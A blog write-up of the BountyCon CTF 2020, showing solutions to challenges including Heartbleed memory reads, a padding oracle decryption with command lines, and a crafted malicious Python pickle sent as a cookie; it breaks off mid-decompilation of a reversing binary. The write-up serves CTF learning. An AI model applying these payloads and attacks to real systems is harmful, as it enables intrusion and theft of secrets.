<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
<meta charset="utf-8">
<title>BountyCon CTF 2020 Write-up</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/normalize/4.1.1/normalize.min.css">
<link rel="stylesheet" href="/-/s.css?CbjRJKAbplre">
<meta name="google-translate-customization" content="f934b5e145f327d8-b53758c32f456a85-g94347205ee1f0565-11"></meta>
<link rel="apple-touch-icon" href="/apple-touch-icon.png?123">
<link rel="icon" href="/favicon.png" sizes="16x16" type="image/png">
<link rel="icon" href="/favicon@2x.png" sizes="32x32" type="image/png">
<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://kishanbagaria.com/feed/">
<link rel="canonical" href="https://kishanbagaria.com/bountycon-2020/">
<meta name="author" content="Kishan Bagaria">
<meta property="og:site_name" content="Kishan Bagaria">

<meta property="article:published_time" content="2020-02-07T00:00:00+00:00">

    <meta name="description" content="Write-up of 17 challenges in BountyCon CTF 2020">

<script>
console.log("%cDON'T PANIC!","font:900 4em Avenir,'Trebuchet MS'");
function forEach(array, callback) { for (var i = 0; i < array.length; i++) callback(array[i], i); };
</script>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>(adsbygoogle=window.adsbygoogle||[]).push({google_ad_client:"ca-pub-5503777349428340",enable_page_level_ads:true})</script>
<style>
  .highlighter-rouge { width: 100% }
  .highlighter-rouge:hover { width: 200% }
  article table th { text-align: left }
  .centered-img { margin: 1em auto; display: block }
</style>

</head>
<body ontouchstart="" class="layout-page">
<div id="wrapper">
<aside>
<header>
<a href="/">
<img src="/-/avatar.svg" width="196" height="215">
<h2>Kishan Bagaria</h2>
</a>
</header>

<div style="text-align:center;margin:1em 0">
<ins class="adsbygoogle content_ad" style="display:inline-block" data-ad-client="ca-pub-5503777349428340" data-ad-slot="5719070676"></ins>
<script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
</div>

</aside>
<main><div id="page">
<article itemscope itemtype="http://schema.org/Article">
<h1 itemprop="name headline" id="page-title">BountyCon CTF 2020 Write-up</h1>
<div itemprop="articleBody">


<p>BountyCon is <a href="https://www.facebook.com/notes/facebook-bug-bounty/announcing-bountycon-2020/3106668869347318/">back again</a>! I participated last year, ranked #1 and even gave a talk at FB APAC HQ. You can find my <a href="/bountycon/">write-up of previous year's CTF here</a>. This time, it's like a regular CTF with all challenges posted on a single page and the complexity has been kicked up a notch. There are 17 challenges in total. I was able to solve all and will be giving a talk again.</p>



<h4 id="disclaimers">Disclaimers</h4>

<ul>
  <li>I had barely any reverse engineering skills before this CTF so my methods may not be optimal and may be weird. Also, you'll find that multiple different solutions exist for reversing challenges.</li>
  <li>Code used to solve challenges might be hastily written and dirty. I've cleaned up some code to make it understandable but it's not as good as it can be.</li>
  <li>This write-up describes a logical chain of thinking you can follow to get the flag. In reality, I went in many wrong directions and things didn't always come to me in the order described here.</li>
</ul>

<h3 id="toolsrepos-mentioned-in-this-write-up">Tools/repos mentioned in this write-up</h3>

<h4 id="reversing">Reversing</h4>

<ul>
  <li><a href="https://www.gnu.org/software/gdb/">GDB</a></li>
  <li><a href="https://github.com/hugsy/gef">GEF</a></li>
  <li><a href="https://www.ghidra-sre.org/">Ghidra</a></li>
  <li><a href="https://binary.ninja/">Binary Ninja</a></li>
  <li><a href="https://frida.re/">Frida</a></li>
  <li><a href="https://github.com/iGio90/Dwarf">Dwarf</a></li>
</ul>

<h4 id="android">Android</h4>

<ul>
  <li><a href="https://developer.android.com/studio/command-line/adb">adb</a></li>
  <li><a href="https://ibotpeaches.github.io/Apktool/">apktool</a></li>
  <li><a href="https://github.com/patrickfav/uber-apk-signer">uber-apk-signer</a></li>
  <li><a href="https://developer.android.com/studio">Android Studio</a></li>
</ul>

<h4 id="web">Web</h4>

<ul>
  <li><a href="https://portswigger.net/burp">Burp Proxy</a></li>
  <li><a href="https://github.com/stefanoj3/dirstalk">dirstalk</a></li>
  <li><a href="https://github.com/internetwache/GitTools">GitTools</a></li>
  <li><a href="https://github.com/iagox86/hash_extender">hash_extender</a></li>
  <li><a href="https://github.com/KishanBagaria/padding-oracle-attacker">padding-oracle-attacker</a></li>
  <li><a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a></li>
  <li><a href="https://beautifier.io/">Online JavaScript Beautifier</a></li>
  <li><a href="https://archive.org/web/">The Wayback Machine</a></li>
  <li><a href="https://gchq.github.io/CyberChef/">CyberChef</a></li>
</ul>

<h4 id="steganographycracking">Steganography/Cracking</h4>

<ul>
  <li><a href="https://github.com/hashcat/hashcat">hashcat</a></li>
  <li><a href="https://www.openwall.com/john/">John the Ripper</a></li>
  <li><a href="https://github.com/keyunluo/pkcrack">pkcrack</a></li>
  <li><a href="https://github.com/exiftool/exiftool">exiftool</a></li>
</ul>

<h4 id="misc">Misc</h4>

<ul>
  <li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a></li>
  <li><a href="http://docs.pwntools.com/en/stable/">pwntools</a></li>
  <li><a href="https://www.virtualbox.org/">VirtualBox</a></li>
  <li><a href="https://www.qemu.org/">QEMU</a></li>
  <li><a href="https://tampermonkey.net/">Tampermonkey</a></li>
  <li><a href="https://www.sublimetext.com/">Sublime Text</a></li>
</ul>

<h3 id="challenges">Challenges</h3>

<table>
  <thead>
    <tr>
      <th>Â </th>
      <th>Name</th>
      <th>Category</th>
      <th>Published</th>
      <th>Solved</th>
      <th>Points</th>
      <th>Solves</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1.</td>
      <td><a href="#heart-of-stone--web--published-dec-18">Heart of Stone        </a></td>
      <td>Web</td>
      <td>Dec 18</td>
      <td>Dec 18</td>
      <td>*</td>
      <td>75+</td>
    </tr>
    <tr>
      <td>2.</td>
      <td><a href="#i-dont-play--web--published-dec-18">I Don't Play          </a></td>
      <td>Web</td>
      <td>Dec 18</td>
      <td>Dec 20</td>
      <td>95</td>
      <td>43</td>
    </tr>
    <tr>
      <td>3.</td>
      <td><a href="#not-a-speck--web--published-dec-18">Not a Speck           </a></td>
      <td>Web</td>
      <td>Dec 18</td>
      <td>Dec 18</td>
      <td>99</td>
      <td>34</td>
    </tr>
    <tr>
      <td>4.</td>
      <td><a href="#tick-tock--web--published-dec-18">Tick Tock             </a></td>
      <td>Web</td>
      <td>Dec 18</td>
      <td>Dec 18</td>
      <td>99</td>
      <td>71</td>
    </tr>
    <tr>
      <td>5.</td>
      <td><a href="#whos-sequel--web--published-dec-18">Who's Sequel?         </a></td>
      <td>Web</td>
      <td>Dec 18</td>
      <td>Dec 18</td>
      <td>*</td>
      <td>75+</td>
    </tr>
    <tr>
      <td>6.</td>
      <td><a href="#secure-login--pwn--published-dec-18">Secure Login          </a></td>
      <td>Pwn</td>
      <td>Dec 18</td>
      <td>Dec 20</td>
      <td>*</td>
      <td>56</td>
    </tr>
    <tr>
      <td>7.</td>
      <td><a href="#anti-what--reversing--published-dec-18">Anti What             </a></td>
      <td>Reversing</td>
      <td>Dec 18</td>
      <td>Dec 19</td>
      <td>*</td>
      <td>70</td>
    </tr>
    <tr>
      <td>8.</td>
      <td><a href="#ghidra-is-cool--reversing--published-dec-18">Ghidra is Cool!       </a></td>
      <td>Reversing</td>
      <td>Dec 18</td>
      <td>Dec 19</td>
      <td>*</td>
      <td>75+</td>
    </tr>
    <tr>
      <td>9.</td>
      <td><a href="#lighthouse--reversing--published-dec-20">Lighthouse            </a></td>
      <td>Reversing, Android</td>
      <td>Dec 20</td>
      <td>Dec 20</td>
      <td>*</td>
      <td>75+</td>
    </tr>
    <tr>
      <td>10.</td>
      <td><a href="#shake-it--reversing--published-dec-20">Shake It              </a></td>
      <td>Reversing, Android</td>
      <td>Dec 20</td>
      <td>Dec 20</td>
      <td>*</td>
      <td>75+</td>
    </tr>
    <tr>
      <td>11.</td>
      <td><a href="#maze-runner--web--published-dec-24">Maze Runner           </a></td>
      <td>Web, Reversing</td>
      <td>Dec 24</td>
      <td>Dec 24</td>
      <td>99</td>
      <td>57</td>
    </tr>
    <tr>
      <td>12.</td>
      <td><a href="#meggenser--reversing--published-dec-24">Meggenser             </a></td>
      <td>Reversing, Android</td>
      <td>Dec 24</td>
      <td>Dec 26</td>
      <td>88</td>
      <td>26</td>
    </tr>
    <tr>
      <td>13.</td>
      <td><a href="#uibeauty--web--published-dec-28">ui.beauty             </a></td>
      <td>Web</td>
      <td>Dec 28</td>
      <td>Dec 28</td>
      <td>97</td>
      <td>43</td>
    </tr>
    <tr>
      <td>14.</td>
      <td><a href="#proof-of-game--web--published-dec-30">Proof-of-Game         </a></td>
      <td>Web, Reversing</td>
      <td>Dec 30</td>
      <td>Dec 30</td>
      <td>99</td>
      <td>25</td>
    </tr>
    <tr>
      <td>15.</td>
      <td><a href="#aglet--reversing--published-dec-31">aglet                 </a></td>
      <td>Reversing</td>
      <td>Dec 31</td>
      <td>Jan 9</td>
      <td>96</td>
      <td>14</td>
    </tr>
    <tr>
      <td>16.</td>
      <td><a href="#gluebar--web--published-jan-2">Glue.bar              </a></td>
      <td>Web</td>
      <td>Jan 2</td>
      <td>Jan 4</td>
      <td>91</td>
      <td>24</td>
    </tr>
    <tr>
      <td>17.</td>
      <td><a href="#matts-string-reverser--web--published-jan-6">Matt's String Reverser</a></td>
      <td>Web</td>
      <td>Jan 6</td>
      <td>Jan 7</td>
      <td>91</td>
      <td>23</td>
    </tr>
  </tbody>
</table>

<p>*I didn't note the points at the time of submission for some of the earlier challenges. 99 points mean first to submit.</p>



<h3 id="heart-of-stone--web--published-dec-18">Heart of Stone â Web â published Dec 18</h3>

<blockquote>
  <p><a href="https://ec2-3-11-22-12.threat.studio/">https://ec2-3-11-22-12.threat.studio/</a></p>

<div style="text-align:center;margin:1em 0">
<ins class="adsbygoogle content_ad" style="display:inline-block" data-ad-client="ca-pub-5503777349428340" data-ad-slot="5719070676"></ins>
<script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
</div>


</blockquote>

<p>TL;DR: <a href="http://heartbleed.com/">Heartbleed</a></p>



<p>The link will just say "403 Forbidden". Directory enumeration won't yield anything. Look at the response headers and you'll find the Server header says "CVE-2014-0160", which refers to Heartbleed, the infamous bug that lets you read random segments of the memory of the server. Countless PoC scripts exist for Heartbleed. Run <a href="https://github.com/sensepost/heartbleed-poc/blob/master/heartbleed-poc.py">any</a> and you'll get the flag:</p>



<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python2 heartbleed-poc.py ec2-3-11-22-12.threat.studio
Scanning ec2-3-11-22-12.threat.studio on port 443
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 2583
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Server TLS version was 1.2

Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 42 6F 75 6E 74 79 43 6F 6E 7B 64 65 39  .@.BountyCon{de9
  0010: 6B 4A 64 4E 47 6D 78 62 78 73 50 53 4B 36 4C 6A  kJdNGmxbxsPSK6Lj
  0020: 46 4B 48 32 37 50 78 59 7D 00 00 00 00 00 00 00  FKH27PxY}.......
  0030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  [...]

WARNING: server ec2-3-11-22-12.threat.studio returned more data than it should - server is vulnerable!

$ strings dump.bin
BountyCon{de9kJdNGmxbxsPSK6LjFKH27PxY}
</code></pre></div></div>

<h3 id="not-a-speck--web--published-dec-18">Not a Speck â Web â published Dec 18</h3>

<blockquote>
  <p>Decrypt messages at blazing speeds with the all new Speck block cipher.</p>



  <p><a href="https://m2qglk5s8i.execute-api.eu-west-2.amazonaws.com/default/c2v53m">https://m2qglk5s8i.execute-api.eu-west-2.amazonaws.com/default/c2v53m</a></p>


</blockquote>

<p>TL;DR: Do a <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Padding Oracle Attack</a> using <a href="https://github.com/KishanBagaria/padding-oracle-attacker">padding-oracle-attacker</a></p>



<p>When you go to the link, you'll see:</p>


<blockquote>
  <p>You have intercepted a secret message encrypted using the "Speck" block cipher. [Decrypt] it now!</p>


</blockquote>

<p>"Decrypt" is a link which will lead you to:
<a href="https://m2qglk5s8i.execute-api.eu-west-2.amazonaws.com/default/c2v53m?msg=5Hr1Y8IQMJ%2BHpmIXhr8dwDd8YO8h/3JG5OEfwtt7zAwBIDWKwbI52ECM6iQ%3D">https://m2qglk5s8i.execute-api.eu-west-2.amazonaws.com/default/c2v53m?msg=5Hr1Y8IQMJ%2BHpmIXhr8dwDd8YO8h/3JG5OEfwtt7zAwBIDWKwbI52ECM6iQ%3D</a></p>



<p>And say:</p>


<blockquote>
  <p>Message decrypted OK:</p>



  <p>SyntaxError: Missing parentheses in call to 'print'. Did you mean print(ptext)?</p>


</blockquote>

<p>Note the <code class="highlighter-rouge">msg=</code> parameter in the link, you can guess that it's base64 encoded data and as the previous page said, it's a secret message encrypted with a block cipher. The word "Speck" is a red herring and researching Speck block cipher will lead you nowhere.</p>



<p>The error message <code class="highlighter-rouge">SyntaxError: Missing parentheses in call to 'print'. Did you mean print(ptext)?</code> is a common one that you see if you run a Python 2 script with Python 3. The error message itself isn't interesting but the fact that the error message is displayed is very useful when trying to exploit any bug since it spits out valuable information.</p>



<p>Now if you tinker with the <code class="highlighter-rouge">msg</code> parameter, you'll see a different error like <code class="highlighter-rouge">Bad request: bad Base64</code> (try "A") or <code class="highlighter-rouge">Bad request: message padding error</code> (try "AAAA"). Googling "padding error" will lead you to "Padding oracle attack" which is what you need to use here.</p>



<p>It's an attack that can be used in web apps (&amp;c.) that use a block cipher in CBC mode for encryption and tell you if the encrypted data was successfully decrypted by the web app or not. Detailed error messages aren't required, if the response differs in any way (length, status, header, body), it'll be enough to use this attack. The gist of padding oracle attacks is that they send a lot of requests to the server and figure out what the encrypted data (ciphertext) is by comparing server responses. You can even encrypt your own text/data using it.</p>



<p>You need to download or write a script to execute this attack. Usually people use PadBuster for this which comes with Kali Linux. It's not easy to install it on macOS. I recommend using <a href="https://github.com/KishanBagaria/padding-oracle-attacker"><code class="highlighter-rouge">padding-oracle-attacker</code></a> which I wrote last year as a modern alternative to all padding oracle scripts. It sends network requests in parallel so it's up to 100x faster compared to others and has an elegant UI.</p>



<p>To install it, enter <code class="highlighter-rouge">yarn global add padding-oracle-attacker</code> or <code class="highlighter-rouge">npm install --global padding-oracle-attacker</code> in your terminal. Padding oracle attacks require you to know two parameters: the block size used on the server (this can be guessed) and how the response differs when decryption on the server fails (this can be found out by looking at the server responses). You can use padding-oracle-attacker's analyze command to help you in finding these two parameters. Let's try this command with block size <code class="highlighter-rouge">16</code>:</p>


<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>poattack analyze <span class="s2">"https://m2qglk5s8i.execute-api.eu-west-2.amazonaws.com/default/c2v53m?msg="</span> 16 <span class="nt">-e</span> <span class="nb">base64</span>
</code></pre></div></div>
<p>The <code class="highlighter-rouge">-e</code> argument specifies the payload encoding which is <code class="highlighter-rouge">base64</code> here. Once it finishes sending the requests, it'll say <code class="highlighter-rouge">Responses don't seem to differ by status code or content length.</code> and suggest you to <code class="highlighter-rouge">Change the &lt;block_size&gt; argument. Common block sizes are 8, 16, 32.</code></p>



<p>Trying out <code class="highlighter-rouge">8</code> or <code class="highlighter-rouge">32</code> as the block size will fail and show you the same output. Block sizes are often a multiple of <code class="highlighter-rouge">4</code>, so you can simply try <code class="highlighter-rouge">4</code>. This is probably what "Speck" refers to because the block size is unusually small. It'll succeed and show you a different output this time:</p>



<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---status code frequencies---
âââââââââ¤ââââââââââââââââ
â  200  â    1 time(s)  â
â  400  â  255 time(s)  â
âââââââââ§ââââââââââââââââ

---content length frequencies---
âââââââââ¤ââââââââââââââââ
â  894  â  255 time(s)  â
â  972  â    1 time(s)  â
âââââââââ§ââââââââââââââââ

---network stats---
256 total network requests | last request took 126ms | 307 kB downloaded | 66.1 kB uploaded

---all responses saved to---
/var/folders/qp/xxx/T/poattack_yyy

---automated analysis---
Responses are likely to have a 400 status code when a decryption error occurs.
You can try specifying 400 for the &lt;error&gt; argument.

Responses are likely to be sized 894 bytes when a decryption error occurs.
You can find out how the response differs by inspecting the saved responses in
/var/folders/qp/xxx/T/poattack_yyy
</code></pre></div></div>

<p>As the output says, the status code of the server response will be 400 if decryption fails and 200 if it succeeds. This is enough information to execute the attack. The content length also differs and if you tinkered with the <code class="highlighter-rouge">msg</code> param, you already know that if the response contains <code class="highlighter-rouge">Bad request</code> or <code class="highlighter-rouge">message padding error</code> it means decryption has failed. You can specify any of these error messages or the status code in the command:</p>


<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>poattack decrypt <span class="s2">"https://m2qglk5s8i.execute-api.eu-west-2.amazonaws.com/default/c2v53m?msg="</span> <span class="nb">base64</span>:5Hr1Y8IQMJ+HpmIXhr8dwDd8YO8h/3JG5OEfwtt7zAwBIDWKwbI52ECM6iQ<span class="o">=</span> 4 400 <span class="nt">-e</span> <span class="nb">base64</span>
</code></pre></div></div>
<p>Once it finishes running, the ciphertext will be decrypted and the flag will be displayed:</p>



<blockquote>
  <p>BountyCon{5j9YGFc85NErBVAcJXH7cYjWWNe}</p>


</blockquote>

<h3 id="tick-tock--web--published-dec-18">Tick Tock â Web â published Dec 18</h3>

<blockquote>
  <p>Time's ticking, hack me before it's too late.</p>



  <p><a href="https://mk3pxi9jwe.execute-api.eu-west-2.amazonaws.com/default/s2vx5m">https://mk3pxi9jwe.execute-api.eu-west-2.amazonaws.com/default/s2vx5m</a></p>



  <p><a href="/--/bountycon20/attachments/tick_tock.tar.gz">tick_tock.tar.gz</a></p>


</blockquote>

<p>TL;DR: Python Pickle Injection</p>



<p><img src="/--/bountycon20/ticktock/ticktock.png" alt="Tick Tock" /></p>



<p>The webpage shows the number of seconds that has passed since you first opened the webpage. This persists even after you refresh the page. How does it work?</p>



<p>Let's check out <code class="highlighter-rouge">lambda_function.py</code> in <code class="highlighter-rouge">tick_tock.tar.gz</code>. You'll notice a variable with a redacted flag is present in the source and that it "pickles" the time when the request is made and stores it in the cookie:</p>



<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flag</span> <span class="o">=</span> <span class="s">"BountyCon{[redacted]}"</span>
<span class="p">[</span><span class="o">...</span><span class="p">]</span>
<span class="n">epoch</span> <span class="o">=</span> <span class="n">Epoch</span><span class="p">(</span><span class="s">'{:d}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())))</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">epoch</span><span class="p">))</span>
</code></pre></div></div>

<p>If you're unfamiliar with what "pickle" is, it's a term that refers to serializing/deserializing objects in Python. As <a href="https://docs.python.org/3/library/pickle.html">the documentation</a> says:</p>



<blockquote>
  <p><strong>Warning</strong> The pickle module is not secure. Only unpickle data you trust.
It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.</p>


</blockquote>

<p>So you need to construct malicious pickle data that when deserialized outputs the flag. Malicious pickles you'll find online might try to read/write a file, make a network request or run a child process using <code class="highlighter-rouge">os.system</code> but trying to do these will fail because of <a href="https://pypi.org/project/function-shield/">function_shield</a>, something commonly used in serverless applications (this challenge is hosted on AWS Lambda):</p>



<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">function_shield</span><span class="o">.</span><span class="n">configure</span><span class="p">({</span>
    <span class="s">"policy"</span><span class="p">:</span> <span class="p">{</span>
        <span class="c1"># 'block' mode =&gt; active blocking
</span>        <span class="c1"># 'alert' mode =&gt; log only
</span>        <span class="c1"># 'allow' mode =&gt; allowed, implicitly occurs if key does not exist
</span>        <span class="s">"outbound_connectivity"</span><span class="p">:</span> <span class="s">"block"</span><span class="p">,</span>
        <span class="s">"read_write_tmp"</span><span class="p">:</span> <span class="s">"block"</span><span class="p">,</span>
        <span class="s">"create_child_process"</span><span class="p">:</span> <span class="s">"block"</span><span class="p">,</span>
        <span class="s">"read_handler"</span><span class="p">:</span> <span class="s">"block"</span>
    <span class="p">},</span>
    <span class="s">"token"</span><span class="p">:</span> <span class="s">"XXXXXXXX"</span><span class="p">,</span>
    <span class="s">"disable_analytics"</span><span class="p">:</span> <span class="s">"true"</span>
<span class="p">})</span>
</code></pre></div></div>

<p>You need to construct a pickle that outputs the contents of the <code class="highlighter-rouge">flag</code> variable.</p>



<p>There are multiple <a href="https://docs.python.org/3/library/pickle.html#data-stream-format">"protocols" or formats that pickle data can be present in</a>:</p>



<blockquote>
  <p>There are currently 6 different protocols which can be used for pickling. The higher the protocol used, the more recent the version of Python needed to read the pickle produced.</p>



  <ul>
    <li>Protocol version 0 is the original âhuman-readableâ protocol and is backwards compatible with earlier versions of Python.</li>
    <li>Protocol version 1 is an old binary format which is also compatible with earlier versions of Python.</li>
  </ul>
</blockquote>

<p>I read up on <a href="https://checkoway.net/musings/pickle/">many</a> <a href="https://intoli.com/blog/dangerous-pickles/">articles</a> and eventually was able to construct a pickle in the lowest protocol 0 (using <code class="highlighter-rouge">pickle.dumps</code> and manually edits) that outputs the flag by calling the <code class="highlighter-rouge">eval</code> function with <code class="highlighter-rouge">flag</code> as argument. It was crucial for the module name to be <code class="highlighter-rouge">lambda_function</code> for the pickle to execute.</p>



<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="n">pickled</span> <span class="o">=</span> <span class="n">b</span><span class="s">"""clambda_function
Epoch
p0
(c__builtin__
eval
p1
(Vflag
p2
tp3
Rp4
tp5
Rp6
."""</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
  <span class="s">'cookie'</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickled</span><span class="p">)</span>
<span class="p">}</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://mk3pxi9jwe.execute-api.eu-west-2.amazonaws.com/default/s2vx5m'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE HTML&gt;</span><span class="nt">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;</span>Timer<span class="nt">&lt;/TITLE&gt;&lt;LINK</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://fonts.googleapis.com/css?family=Orbitron"</span><span class="nt">&gt;&lt;STYLE&gt;</span>body{background: black;}.clock{position: absolute; top: 50%; left: 50%; transform: translateX(-50%) translateY(-50%); color: #17D4FE; font-size: 60px; font-family: Orbitron; letter-spacing: 7px;}<span class="nt">&lt;/STYLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;DIV</span> <span class="na">id=</span><span class="s">"timer"</span> <span class="na">class=</span><span class="s">"clock"</span> <span class="na">onload=</span><span class="s">"showTime()"</span><span class="nt">&gt;&lt;/DIV&gt;&lt;SCRIPT&gt;</span>function showTime(){var future = Date.now() / 1000 | 0;var delta = future - BountyCon{qZwRdkr7ZsdhPfj3qV4MyEEwEwG};var time = delta.toString();document.getElementById("timer").innerText = time;document.getElementById("timer").textContent = time;setTimeout(showTime, 1000);}showTime();<span class="nt">&lt;/SCRIPT&gt;&lt;/BODY&gt;&lt;/HTML&gt;</span>
</code></pre></div></div>

<blockquote>
  <p>BountyCon{qZwRdkr7ZsdhPfj3qV4MyEEwEwG}</p>


</blockquote>

<p>Later I learnt a very simple way of constructing the pickle thanks to <a href="https://twitter.com/mrcodedbrain">Santosh Bhandari</a>:</p>


<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">### lambda_function.py
</span><span class="k">class</span> <span class="nc">Epoch</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
  <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">):</span>
    <span class="bp">self</span><span class="o">.</span><span class="n">ts</span> <span class="o">=</span> <span class="n">timestamp</span>

<span class="k">class</span> <span class="nc">flag</span><span class="p">:</span>
  <span class="k">pass</span>

<span class="c1">### get_flag.py
</span><span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">lambda_function</span>

<span class="n">epoch</span> <span class="o">=</span> <span class="n">lambda_function</span><span class="o">.</span><span class="n">Epoch</span><span class="p">(</span><span class="n">lambda_function</span><span class="o">.</span><span class="n">flag</span><span class="p">)</span>

<span class="n">pickled</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">epoch</span><span class="p">)</span>

<span class="p">[</span><span class="o">...</span><span class="p">]</span>
</code></pre></div></div>

<h3 id="anti-what--reversing--published-dec-18">Anti What â Reversing â published Dec 18</h3>

<blockquote>
  <p>What do you mean a debugger is already attached?</p>



  <p><a href="/--/bountycon20/attachments/anti_what.tar.gz">anti_what.tar.gz</a></p>


</blockquote>

<p>Download <code class="highlighter-rouge">anti_what.tar.gz</code>, extract it and open <code class="highlighter-rouge">anti_what</code> in <a href="https://www.ghidra-sre.org/">Ghidra</a>. Running it directly will just show "Press any key to quitâ¦".</p>



<p>Decompilation of the <code class="highlighter-rouge">main</code> function:</p>


<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">param_1</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">param_2</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">lVar2</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="n">extraout_var</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">uVar3</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">local_15c</span><span class="p">;</span>
  <span class="n">termios</span> <span class="n">local_158</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_118</span> <span class="p">[</span><span class="mi">264</span><span class="p">];</span>
  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
  
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="n">local_15c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">lVar2</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">lVar2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">local_15c</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">lVar2</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">lVar2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">local_15c</span> <span class="o">=</span> <span class="n">local_15c</span> <span class="o">*</span> <span class="mi">3</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">// this if condition checks if a debugger is attached</span>
  <span class="c1">// if you flip this condition, you can attach a debugger easily</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_15c</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">RC4_set_key</span><span class="p">((</span><span class="n">RC4_KEY</span> <span class="o">*</span><span class="p">)</span><span class="n">local_118</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="n">key</span><span class="p">);</span>
    <span class="n">RC4</span><span class="p">((</span><span class="n">RC4_KEY</span> <span class="o">*</span><span class="p">)</span><span class="n">local_118</span><span class="p">,</span><span class="mh">0x4e</span><span class="p">,</span><span class="n">ptext</span><span class="p">,</span><span class="n">ptext</span><span class="p">);</span>
